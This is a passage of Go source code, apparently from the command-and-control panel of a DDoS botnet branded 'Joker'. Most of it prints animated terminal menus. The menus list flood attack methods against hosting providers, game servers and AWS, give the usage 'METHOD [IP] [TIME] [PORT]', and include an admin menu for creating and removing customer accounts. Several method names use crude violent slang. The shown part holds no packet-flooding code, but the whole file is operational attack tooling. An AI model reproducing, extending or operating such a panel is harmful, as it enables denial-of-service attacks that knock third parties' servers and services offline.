            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔═════════════════════════╗═════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mnfo-down .  ovh-down  \x1b[1;35m║   \x1b[1;32movh-crush .  dedipath \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║   \x1b[1;32mgame-nfo .  ovh-game  \x1b[1;35m║   \x1b[1;32mfivem-nfo .  serverv2 \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚╗════════════════════════╝════════════════════════╔╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32msy-killall   .  sy-killallv2  .  sy-killallv3  \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mcaptcha-down .  2k-21         .  ddos-guard    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mark-destroy  .  tcp-down      .  udp-downv2    \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mudp-down     .  sy-kilallv4   .  server        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mvpn-down     .  od-down       .  redsyn        \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m              ║  \x1b[1;32mnfo-mob      .  aws-destroy   .  sos           \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╔╝  \x1b[1;32m wra         .     odin     .   dns       .    sos   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║══════════════════════════════════════════════════╚╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║═══════════════════════════════════════════════════║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║        \x1b[1;32mapisend [METHOD [IP] [TIME] [PORT]         \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ╚═══════════════════════════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if err != nil || cmd == "BANG" || cmd == "bang" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;32m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\x1b[1;35m _--                  --_         \r\n"))
            this.conn.Write([]byte("\x1b[1;35m<      ╦╔═╗╦╔═╔═╗╦═╗     >)        \r\n"))
            this.conn.Write([]byte("\x1b[1;35m|      ║║ ║╠╩╗║╣ ╠╦╝      |        \r\n"))
            this.conn.Write([]byte("\x1b[1;35m /._  ╚╝╚═╝╩ ╩╚═╝╩╚═   _./         \r\n"))
            this.conn.Write([]byte("\x1b[1;32m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\x1b[1;35m          | |   |                  \r\n"))
            this.conn.Write([]byte("\x1b[1;35m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\x1b[1;32m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\x1b[1;35m          | ;  :|                 \r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            time.Sleep(100 * time.Millisecond)
        }//if userInfo.admin == 1 && cmd == "ADDREG"
        if userInfo.admin == 1 && cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[38m                      ╔══════════════════\033[37m═══════════════════╗\r\n"))
            this.conn.Write([]byte("\033[38m                      ║ ADDREG - Create a\033[37mn Regular Account  ║\r\n"))
            this.conn.Write([]byte("\033[38m                      ║ REMOVEUSER - Remo\033[37mve an Account      ║\r\n"))
            this.conn.Write([]byte("\033[38m                      ╚══════════════════\033[37m═══════════════════╝\r\n"))
            
            continue
        }
            if err != nil || cmd == "@" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[38m                       nice\033[37mtry\r\n"))
            continue
        }
            if err != nil || cmd == "RaW" || cmd == "RAW" || cmd == "raw" || cmd == "Raw" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mudpraw - Raw UDP Flood   \x1b[1;35m║ \x1b[1;32mhexraw - Raw HEX Flood     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcpraw - Raw TCP Flood \x1b[1;35m║ ║ \x1b[1;32mvseraw - Raw VSE Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstdraw - Raw STD Flood \x1b[1;35m║ ║ \x1b[1;32msynraw - Raw SYN Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mudpraw - Raw UDP Flood   \x1b[1;35m║ \x1b[1;32mhexraw - Raw HEX Flood     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcpraw - Raw TCP Flood \x1b[1;35m║ ║ \x1b[1;32mvseraw - Raw VSE Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstdraw - Raw STD Flood \x1b[1;35m║ ║ \x1b[1;32msynraw - Raw SYN Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mudpraw - Raw UDP Flood   \x1b[1;35m║ \x1b[1;32mhexraw - Raw HEX Flood     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcpraw - Raw TCP Flood \x1b[1;35m║ ║ \x1b[1;32mvseraw - Raw VSE Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstdraw - Raw STD Flood \x1b[1;35m║ ║ \x1b[1;32msynraw - Raw SYN Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mudpraw - Raw UDP Flood   \x1b[1;35m║ \x1b[1;32mhexraw - Raw HEX Flood     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcpraw - Raw TCP Flood \x1b[1;35m║ ║ \x1b[1;32mvseraw - Raw VSE Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstdraw - Raw STD Flood \x1b[1;35m║ ║ \x1b[1;32msynraw - Raw SYN Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mudpraw - Raw UDP Flood   \x1b[1;35m║ \x1b[1;32mhexraw - Raw HEX Flood     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcpraw - Raw TCP Flood \x1b[1;35m║ ║ \x1b[1;32mvseraw - Raw VSE Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstdraw - Raw STD Flood \x1b[1;35m║ ║ \x1b[1;32msynraw - Raw SYN Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
            continue

        }

            if err != nil || cmd == "gen3" || cmd == "GEN3" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32movhslav - Slavic Flood   \x1b[1;35m║ \x1b[1;32miotv1 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mcpukill - Cpu Rape Flood \x1b[1;35m║ \x1b[1;32miotv2 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemkill - Fivem Kill \x1b[1;35m║ ║ \x1b[1;32miotv3 - Custom Method!   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32micmprape  - ICMP Rape  \x1b[1;35m║ ║ \x1b[1;32mssdp  - Amped SSDP       \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcprape - Raping TCP   \x1b[1;35m║ ║ \x1b[1;32marknull - Ark Method     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnforape - Nfo Method   \x1b[1;35m║ ║ \x1b[1;32m2kdown  - NBA 2K Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32movhslav - Slavic Flood   \x1b[1;35m║ \x1b[1;32miotv1 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mcpukill - Cpu Rape Flood \x1b[1;35m║ \x1b[1;32miotv2 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemkill - Fivem Kill \x1b[1;35m║ ║ \x1b[1;32miotv3 - Custom Method!   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32micmprape  - ICMP Rape  \x1b[1;35m║ ║ \x1b[1;32mssdp  - Amped SSDP       \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcprape - Raping TCP   \x1b[1;35m║ ║ \x1b[1;32marknull - Ark Method     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnforape - Nfo Method   \x1b[1;35m║ ║ \x1b[1;32m2kdown  - NBA 2K Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32movhslav - Slavic Flood   \x1b[1;35m║ \x1b[1;32miotv1 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mcpukill - Cpu Rape Flood \x1b[1;35m║ \x1b[1;32miotv2 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemkill - Fivem Kill \x1b[1;35m║ ║ \x1b[1;32miotv3 - Custom Method!   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32micmprape  - ICMP Rape  \x1b[1;35m║ ║ \x1b[1;32mssdp  - Amped SSDP       \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcprape - Raping TCP   \x1b[1;35m║ ║ \x1b[1;32marknull - Ark Method     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnforape - Nfo Method   \x1b[1;35m║ ║ \x1b[1;32m2kdown  - NBA 2K Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ \r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32movhslav - Slavic Flood   \x1b[1;35m║ \x1b[1;32miotv1 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mcpukill - Cpu Rape Flood \x1b[1;35m║ \x1b[1;32miotv2 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemkill - Fivem Kill \x1b[1;35m║ ║ \x1b[1;32miotv3 - Custom Method!   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32micmprape  - ICMP Rape  \x1b[1;35m║ ║ \x1b[1;32mssdp  - Amped SSDP       \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcprape - Raping TCP   \x1b[1;35m║ ║ \x1b[1;32marknull - Ark Method     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnforape - Nfo Method   \x1b[1;35m║ ║ \x1b[1;32m2kdown  - NBA 2K Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗╦╔═\x1b[1;32m╔═╗╦═╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║╠╩╗\x1b[1;32m║╣ ╠╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝╩ ╩\x1b[1;32m╚═╝╩╚═\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns \x1b[1;35m🤡\r\n"))
            this.conn.Write([]byte("\x1b[1;35m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32movhslav - Slavic Flood   \x1b[1;35m║ \x1b[1;32miotv1 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║ \x1b[1;32mcpukill - Cpu Rape Flood \x1b[1;35m║ \x1b[1;32miotv2 - Custom Method!     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mfivemkill - Fivem Kill \x1b[1;35m║ ║ \x1b[1;32miotv3 - Custom Method!   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32micmprape  - ICMP Rape  \x1b[1;35m║ ║ \x1b[1;32mssdp  - Amped SSDP       \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mtcprape - Raping TCP   \x1b[1;35m║ ║ \x1b[1;32marknull - Ark Method     \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mnforape - Nfo Method   \x1b[1;35m║ ║ \x1b[1;32m2kdown  - NBA 2K Flood   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\r\n"))
            continue
        }   
        if err != nil || cmd == "LAYER4" || cmd == "layer4" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦\x1b[1;32m\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║\x1b[1;32m\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝\x1b[1;32m\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns\x1b[1;35m 🤡\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mudp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mvse [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mtcp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mack [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstd [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mdns [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32msyn [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32movh [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mice [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mice [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║    \x1b[1;32mExample How To Attack: METHOD [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚═══════════════════════════════════════════════════════╝\x1b[37m\r\n"))
		    time.Sleep(500 * time.Millisecond)
		    this.conn.Write([]byte("\033[2J\033[1H"))
		    this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ╦╔═╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                 ║║ ║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                                ╚╝╚═╝\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m                            🤡 \x1b[1;32mWe are all clowns\x1b[1;35m 🤡\x1b[37m\r\n"))
            this.conn.Write([]byte("\033[38m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╔══════════════════════════╦════════════════════════════╗\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mudp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mvse [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ║  \x1b[1;32mtcp [IP] [TIME] [PORT]  \x1b[1;35m║   \x1b[1;32mack [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝\x1b[37m\r\n"))
            this.conn.Write([]byte("\x1b[1;35m             ║ \x1b[1;32mstd [IP] [TIME] [PORT] \x1b[1;35m║ ║ \x1b[1;32mdns [IP] [TIME] [PORT]   \x1b[1;35m║\x1b[37m\r\n"))
